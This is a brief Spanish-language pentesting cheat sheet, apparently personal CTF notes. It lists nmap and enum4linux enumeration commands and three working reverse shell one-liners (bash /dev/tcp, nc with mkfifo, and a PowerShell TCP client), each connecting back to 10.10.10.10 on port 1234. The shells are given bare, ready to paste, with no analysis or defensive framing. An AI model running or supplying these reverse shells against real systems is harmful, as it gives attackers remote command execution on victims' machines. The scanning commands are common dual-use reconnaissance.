 


#enumeracion #nmap #interes 
La manera universal de enumerar con nmap --> OJO EN CTFS --> la mayoria de veces este es el parametro general **nmap -p- --open -sC -sV --min-rate 5000 -vvv -n -Pn 10.10.10.10 --> REEMPLAZA AQUI POR LA IP VICTIMA** 


este comando me sirivo para sacar la version del servidor dns alojada en el puerto 53
`sudo nmap -sU --open -A 10.129.1.121 -p 53 -sV  --packet-trace`

![[Pasted image 20240904211003.png]]


escaneo profundo en smb lo que no puede traer, usuarios, sistemas operativos, incluso intenta fuerza bruta y contrasenas
`enum4linux -a 10.129.144.116`


#reverse_shell 
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
Código: powershell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
